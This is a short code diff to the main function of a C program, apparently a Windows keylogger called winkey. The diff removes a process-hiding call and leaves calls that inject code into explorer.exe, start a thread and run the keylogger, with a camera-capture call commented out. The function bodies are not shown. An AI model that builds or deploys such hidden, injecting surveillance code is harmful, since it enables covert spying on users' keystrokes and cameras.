@@ -174,10 +174,8 @@ int run_winkey(void)
 
 int main(void)
 {
-	hide_process(L"C:\\Windows\\System32\\winkey.exe");
 	CreateThread(NULL, 0, thread_micro, NULL, 0, NULL);
 	//start_camera();
-	
 	inject_into_explorer();
 	return (run_winkey());
 }
